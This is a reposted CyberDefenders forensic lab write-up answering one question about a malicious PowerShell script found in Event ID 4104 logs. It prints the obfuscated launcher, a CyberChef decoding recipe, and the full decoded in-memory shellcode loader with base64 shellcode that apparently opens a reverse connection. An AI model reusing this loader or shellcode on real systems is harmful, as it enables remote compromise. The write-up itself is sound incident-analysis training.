# :globe_with_meridians: Lfi Escalation Lab Writeup Cyberdefenders 10Ddfb745Ced

> **Original Source:** [Lfi Escalation Lab Writeup Cyberdefenders 10Ddfb745Ced](https://infosecwriteups.com/lfi-escalation-lab-writeup-cyberdefenders-10ddfb745ced)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

>

*Q15: The PowerShell script executed shellcode as part of its payload. What is the name of the variable that stores the raw shellcode in the script?*


since it’s a powershell script, we can investigate the powershell operational log file as it records the actual powershell code that executed, including decoded and de-obfuscated script blocks with Event ID 4104, so with a quick filter on event id 4104, and `LykIsnWn.ps1`we got one single event:


now, we’ve got a huge base64 encoded command, let’s decode it:


```
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+
'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};
$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;
$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::
create((New-Object System.IO.StreamReader
(New-Object System.IO.Compression.GzipStream
((New-Object System.IO.MemoryStream (,[System.Convert]::FromBase64String
(((''H4sIAMGAvmgCA7VWa4/aOhD9Xqn/''+''IaqQkqhZCA/1LitVuglsgJawsOGxQFHlTQy4m
BgSh4d6+9/vOI+F1bLV{0}is1EsKxZ8bjM8dnMo98lxPmS4dH6ef7d1L6dFGA1pKS2x5K1{0}1N
yu066mkx54YT6bOkTI{0}Nps''+''7WiPizm5taFATY58l7voG5EYZ4/UgJDhVV+kcaLXGAr+4
ef2CXSz+l{0}''+''Pd8g7JHRFOzYw25SyxdGb4n1trMRSKtvLOhhCvyt2+yOr0qzvK{0}2wjRU
JGdY8jxOu9RKqvSL1Vs2D9usCLbxA1YyOY8PyJ+uZQf+CGa4w5E22Eb8yXzQhnOcjpNgHkU+PGh
RJTERpFh2A2Ya{0}hegMNQ1qSpiD+dzf5Wpunm95HPyRrnWz7HAds4ONgRF4f5Jv''+''I9iu/x
fAZeDg+Iv5ipKpjt2AorOT+iVJP+Sxilg/cZdG91Us6dwKrLA1WDir48ps28iOLEUb6QZ0ICFZ6
ECIDeLwHgPKMO+nSBOqeJ7JnGKxjyVbosJLHrZ0nXJBu2RpwFR{0}jN9YMIq7MntKUc9{0}pb7a
{0}RipkrOJIFTEyHjHizk/uz0ucW1VDYvM7jOp4TH9ePPloTN6OqcqkeeE5xDEc+M+tAeoqcLmC
vjileIC4gFrR44X''+''a7JvzJ14wI9XBguFDTELKCcqvPk0mqpsgt{0}8Z''+''rwC55B57m5n
BBcGadXopjtrt4ByO5RlEYalI{0}ghvqapKDEcWeJhl+SNIlI+IsHsqndO2IcuKikGfhZupzNNN
da8wPeRC5UFRAoO9ss''+''EsQFYBoUpN42Dw6ZJHtLl+Eo4YohYsDkXZQD''+''pgRMDhcUCWA
RGNaqHkH89Z6Q/EabGLBsChagDyk1yPmFlpgT76''+''cZ{0}YLEsoLXDJAzrKEYjuUcU0akoCD
+giMxfz/SOGl6ohcagFOK''+''6Nkd2tqH''+''rmgfw65Zv1acDRFKMYj4ICFFbC1iUL8qZJIj
PKhcEe6''+''Bjzjlk9t78uKFFt7+NnwG9jzj22XLLpcZ2vbrYXdhnVtkP1i715{0}DNf74uGq
M6xw57bFa12j2SO6WVm6pt6H8aDFW40WH7eMZn/pUr17uzoUKqFO9s2RiJXE''+''cCuV5oNul
MuVu7K+AvTGpLhYGV5nTfaHNox''+''BS+/aZis09Ra9/VK7fxyVrMmINgsVazkfsdD5NK4XCo
Wqh+r20TBM5pXt40PxnvWb7tqs+KxQrVVWxq1h1PzboW''+''Wyr2MzMLqFIVps2P4rqdLGoma
YlkvwpDewzF7PMo1B48e2Xi0sCtXRA1qao2GJTDYP90t4t/bNnl{0}QKy0PH9h1e0SGOxHL{0}
JrW5AEZ7cnRKhSK47CEViYzTADWmmyNxnK8sboU/PuDEjOGtHOy7TXrX91J8a/Q/vwBKjkdEJ+
XS7McK/9oCql7/y5HymfFfE{0}EbRSES0Shy''+''CDP2VWz''+''WGClittlRHgoCjTtFQ58
TKHRQSvMGGpQylyh9qDM0GcS9RfNaNCKE7o0UqUnQ/XUBLKpm5sJZAicj/mYb2N/wZeafijrOg
i4ftArMbvffrAa2xyVJJomegAA8xSdxtEhIJlLivKnwYIuz0FzXoPrNeRg{0}xUoBChWcnEFfi
Zj9By9+FBPLHgGHWBWhGNPRXuP+QEBrvAWREX0v/N+mtt9r/5JzqTqs4Q/7/ecOc{0}''+''9Z
vVNPNI1Ac2LyecTZ5L9xw4/QoSDnQP6SXHS0S9hkF6Rs8pCUYD+8/QR
H7h{0}Eb/qwCdTrOD/AhBI1txXCwAA'')-f''3'')))),
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);
```


so what’s happening here is:


```
1- Base64 decode the payload
2- Decompress with GZip
3- Read decoded text into memory
4- Create a ScriptBlock
5- Execute it in memory
```


By following this sequence in reverse, the payload can be decoded by:


```
1- Extract the encoded payload string
2- Remove string concatenation markers (''+'' → nothing)
3- Replace format placeholders ({0} → 3, as applied by -f '3')
4- Base64-decode the result
5- GZip-decompress the decoded bytes
6- Read the decompressed text
7- Recover the original PowerShell code
➡️ Encoded string → formatted → decoded → decompressed → readable script
```


so let’s extract the shellcode:


```
H4sIAMGAvmgCA7VWa4/aOhD9Xqn/''+''IaqQkqhZCA/1LitVuglsgJawsOGxQFHlTQy4m
BgSh4d6+9/vOI+F1bLV{0}is1EsKxZ8bjM8dnMo98lxPmS4dH6ef7d1L6dFGA1pKS2x5K1{0}1N
yu066mkx54YT6bOkTI{0}Nps''+''7WiPizm5taFATY58l7voG5EYZ4/UgJDhVV+kcaLXGAr+4
ef2CXSz+l{0}''+''Pd8g7JHRFOzYw25SyxdGb4n1trMRSKtvLOhhCvyt2+yOr0qzvK{0}2wjRU
JGdY8jxOu9RKqvSL1Vs2D9usCLbxA1YyOY8PyJ+uZQf+CGa4w5E22Eb8yXzQhnOcjpNgHkU+PGh
RJTERpFh2A2Ya{0}hegMNQ1qSpiD+dzf5Wpunm95HPyRrnWz7HAds4ONgRF4f5Jv''+''I9iu/x
fAZeDg+Iv5ipKpjt2AorOT+iVJP+Sxilg/cZdG91Us6dwKrLA1WDir48ps28iOLEUb6QZ0ICFZ6
ECIDeLwHgPKMO+nSBOqeJ7JnGKxjyVbosJLHrZ0nXJBu2RpwFR{0}jN9YMIq7MntKUc9{0}pb7a
{0}RipkrOJIFTEyHjHizk/uz0ucW1VDYvM7jOp4TH9ePPloTN6OqcqkeeE5xDEc+M+tAeoqcLmC
vjileIC4gFrR44X''+''a7JvzJ14wI9XBguFDTELKCcqvPk0mqpsgt{0}8Z''+''rwC55B57m5n
BBcGadXopjtrt4ByO5RlEYalI{0}ghvqapKDEcWeJhl+SNIlI+IsHsqndO2IcuKikGfhZupzNNN
da8wPeRC5UFRAoO9ss''+''EsQFYBoUpN42Dw6ZJHtLl+Eo4YohYsDkXZQD''+''pgRMDhcUCWA
RGNaqHkH89Z6Q/EabGLBsChagDyk1yPmFlpgT76''+''cZ{0}YLEsoLXDJAzrKEYjuUcU0akoCD
+giMxfz/SOGl6ohcagFOK''+''6Nkd2tqH''+''rmgfw65Zv1acDRFKMYj4ICFFbC1iUL8qZJIj
PKhcEe6''+''Bjzjlk9t78uKFFt7+NnwG9jzj22XLLpcZ2vbrYXdhnVtkP1i715{0}DNf74uGq
M6xw57bFa12j2SO6WVm6pt6H8aDFW40WH7eMZn/pUr17uzoUKqFO9s2RiJXE''+''cCuV5oNul
MuVu7K+AvTGpLhYGV5nTfaHNox''+''BS+/aZis09Ra9/VK7fxyVrMmINgsVazkfsdD5NK4XCo
Wqh+r20TBM5pXt40PxnvWb7tqs+KxQrVVWxq1h1PzboW''+''Wyr2MzMLqFIVps2P4rqdLGoma
YlkvwpDewzF7PMo1B48e2Xi0sCtXRA1qao2GJTDYP90t4t/bNnl{0}QKy0PH9h1e0SGOxHL{0}
JrW5AEZ7cnRKhSK47CEViYzTADWmmyNxnK8sboU/PuDEjOGtHOy7TXrX91J8a/Q/vwBKjkdEJ+
XS7McK/9oCql7/y5HymfFfE{0}EbRSES0Shy''+''CDP2VWz''+''WGClittlRHgoCjTtFQ58
TKHRQSvMGGpQylyh9qDM0GcS9RfNaNCKE7o0UqUnQ/XUBLKpm5sJZAicj/mYb2N/wZeafijrOg
i4ftArMbvffrAa2xyVJJomegAA8xSdxtEhIJlLivKnwYIuz0FzXoPrNeRg{0}xUoBChWcnEFfi
Zj9By9+FBPLHgGHWBWhGNPRXuP+QEBrvAWREX0v/N+mtt9r/5JzqTqs4Q/7/ecOc{0}''+''9Z
vVNPNI1Ac2LyecTZ5L9xw4/QoSDnQP6SXHS0S9hkF6Rs8pCUYD+8/QR
H7h{0}Eb/qwCdTrOD/AhBI1txXCwAA
```


with this amazing cyberchef recipe, we can decode all of it perfectly [LINK](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C'%5C'%2B%5C'%5C''%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%7B0%7D'%7D,'3',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFNR0F2bWdDQTdWV2E0L2FPaEQ5WHFuLycnKycnSWFxUWtxaFpDQS8xTGl0VnVnbHNnSmF3c09HeFFGSGxUUXk0bQpCZ1NoNGQ2Kzkvdk9JK0YxYkxWezB9aXMxRXNLeFo4YmpNOGRuTW85OGx4UG1TNGRINmVmN2QxTDZkRkdBMXBLUzJ4NUsxezB9MU4KeXUwNjZta3g1NFlUNmJPa1RJezB9TnBzJycrJyc3V2lQaXptNXRhRkFUWTU4bDd2b0c1RVlaNC9VZ0pEaFZWK2tjYUxYR0FyKzQKZWYyQ1hTeitsezB9JycrJydQZDhnN0pIUkZPell3MjVTeXhkR2I0bjF0ck1SU0t0dkxPaGhDdnl0Mit5T3IwcXp2S3swfTJ3alJVCkpHZFk4anhPdTlSS3F2U0wxVnMyRDl1c0NMYnhBMVl5T1k4UHlKK3VaUWYrQ0dhNHc1RTIyRWI4eVh6UWhuT2NqcE5nSGtVK1BHaApSSlRFUnBGaDJBMllhezB9aGVnTU5RMXFTcGlEK2R6ZjVXcHVubTk1SFB5UnJuV3o3SEFkczRPTmdSRjRmNUp2JycrJydJOWl1L3gKZkFaZURnK0l2NWlwS3BqdDJBb3JPVCtpVkpQK1N4aWxnL2NaZEc5MVVzNmR3S3JMQTFXRGlyNDhwczI4aU9MRVViNlFaMElDRlo2CkVDSURlTHdIZ1BLTU8rblNCT3FlSjdKbkdLeGp5VmJvc0pMSHJaMG5YSkJ1MlJwd0ZSezB9ak45WU1JcTdNbnRLVWM5ezB9cGI3YQp7MH1SaXBrck9KSUZURXlIakhpemsvdXowdWNXMVZEWXZNN2pPcDRUSDllUFBsb1RONk9xY3FrZWVFNXhERWMrTSt0QWVvcWNMbUMKdmppbGVJQzRnRnJSNDRYJycrJydhN0p2ekoxNHdJOVhCZ3VGRFRFTEtDY3F2UGswbXFwc2d0ezB9OFonJysnJ3J3QzU1QjU3bTVuCkJCY0dhZFhvcGp0cnQ0QnlPNVJsRVlhbEl7MH1naHZxYXBLREVjV2VKaGwrU05JbEkrSXNIc3FuZE8ySWN1S2lrR2ZoWnVwek5OTgpkYTh3UGVSQzVVRlJBb085c3MnJysnJ0VzUUZZQm9VcE40MkR3NlpKSHRMbCtFbzRZb2hZc0RrWFpRRCcnKycncGdSTURoY1VDV0EKUkdOYXFIa0g4OVo2US9FYWJHTEJzQ2hhZ0R5azF5UG1GbHBnVDc2JycrJydjWnswfVlMRXNvTFhESkF6cktFWWp1VWNVMGFrb0NECitnaU14ZnovU09HbDZvaGNhZ0ZPSycnKycnNk5rZDJ0cUgnJysnJ3JtZ2Z3NjVadjFhY0RSRktNWWo0SUNGRmJDMWlVTDhxWkpJagpQS2hjRWU2JycrJydCanpqbGs5dDc4dUtGRnQ3K05ud0c5anpqMjJYTExwY1oydmJyWVhkaG5WdGtQMWk3MTV7MH1ETmY3NHVHcQpNNnh3NTdiRmExMmoyU082V1ZtNnB0Nkg4YURGVzQwV0g3ZU1abi9wVXIxN3V6b1VLcUZPOXMyUmlKWEUnJysnJ2NDdVY1b051bApNdVZ1N0srQXZUR3BMaFlHVjVuVGZhSE5veCcnKycnQlMrL2FaaXMwOVJhOS9WSzdmeHlWck1tSU5nc1Zhemtmc2RENU5LNFhDbwpXcWgrcjIwVEJNNXBYdDQwUHhudldiN3RxcytLeFFyVlZXeHExaDFQemJvVycnKycnV3lyMk16TUxxRklWcHMyUDRycWRMR29tYQpZbGt2d3BEZXd6RjdQTW8xQjQ4ZTJYaTBzQ3RYUkExcWFvMkdKVERZUDkwdDR0L2JObmx7MH1RS3kwUEg5aDFlMFNHT3hITHswfQpKclc1QUVaN2NuUktoU0s0N0NFVmlZelRBRFdtbXlOeG5LOHNib1UvUHVERWpPR3RIT3k3VFhyWDkxSjhhL1EvdndCS2prZEVKKwpYUzdNY0svOW9DcWw3L3k1SHltZkZmRXswfUViUlNFUzBTaHknJysnJ0NEUDJWV3onJysnJ1dHQ2xpdHRsUkhnb0NqVHRGUTU4ClRLSFJRU3ZNR0dwUXlseWg5cURNMEdjUzlSZk5hTkNLRTdvMFVxVW5RL1hVQkxLcG01c0paQWljai9tWWIyTi93WmVhZmlqck9nCmk0ZnRBck1idmZmckFhMnh5VkpKb21lZ0FBOHhTZHh0RWhJSmxMaXZLbndZSXV6MEZ6WG9Qck5lUmd7MH14VW9CQ2hXY25FRmZpClpqOUJ5OStGQlBMSGdHSFdCV2hHTlBSWHVQK1FFQnJ2QVdSRVgwdi9OK210dDlyLzVKenFUcXM0US83L2VjT2N7MH0nJysnJzlaCnZWTlBOSTFBYzJMeWVjVFo1TDl4dzQvUW9TRG5RUDZTWEhTMFM5aGtGNlJzOHBDVVlEKzgvUVIKSDdoezB9RWIvcXdDZFRyT0QvQWhCSTF0eFhDd0FB&oeol=CRLF):


so now, by reading the following decoded script, we can answer easily:


```
function xb {
Param ($qx28T, $vN)
$csZ = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')
[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
return $csZ.GetMethod('GetProcAddress',
[Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).
Invoke($null, @([System.Runtime.InteropServices.HandleRef]
(New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),
($csZ.GetMethod('GetModuleHandle')).Invoke($null, @($qx28T)))), $vN)) }

function a6 {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $tdQq,
[Parameter(Position = 1)] [Type] $ig = [Void])
$g9s = [AppDomain]::CurrentDomain.DefineDynamicAssembly
((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
DefineDynamicModule('InMemoryModule', $false).
DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
AutoClass', [System.MulticastDelegate])
$g9s.DefineConstructor('RTSpecialName,HideBySig,
Public', [System.Reflection.CallingConventions]::Standard, $tdQq).
SetImplementationFlags('Runtime, Managed') $g9s.DefineMethod('Invoke',
'Public, HideBySig, NewSlot, Virtual', $ig, $tdQq).
SetImplementationFlags('Runtime, Managed')
return $g9s.CreateType() }

[Byte[]]$acBD8 = [System.Convert]::FromBase64String("/OiPAAAAYInlMd
Jki1Iwi1IMi1IUMf+LcigPt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB
0TAHQUItIGItYIAHThcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNm
iwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///
9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/
VagpowKi9lGgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM
/04Idexo8LWiVv/VagBqBFZXaALZyF// 1Ys2akBoABAAAFZqAGhYpFPl/
9WTU2oAVlNXaALZyF//1QHDKcZ17sM=")
[Uint32]$o3jH = 0 $i3 = [System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer((xb kernel32.dll VirtualAlloc),
(a6 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).
Invoke([IntPtr]::Zero, $acBD8.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::
Copy($acBD8, 0, $i3, $acBD8.length)
if (([System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer ((xb kernel32.dll VirtualProtect),
(a6 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType())
([Bool]))).Invoke($i3, [Uint32]
$acBD8.Length,0x10,[Ref]$o3jH)) -eq $true) {
$v_9 = [System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer((xb kernel32.dll CreateThread),
(a6 @([IntPtr] ,[UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
([IntPtr]))). Invoke([IntPtr]::Zero,0,
$i3,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
((xb kernel32.dll WaitForSingleObject), (a6 @([IntPtr], [Int32]))).
Invoke($v_9,0xffffffff) | Out-Null }
```


>

`*acBD8*`

---

*Originally published on [Medium](https://infosecwriteups.com/lfi-escalation-lab-writeup-cyberdefenders-10ddfb745ced). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
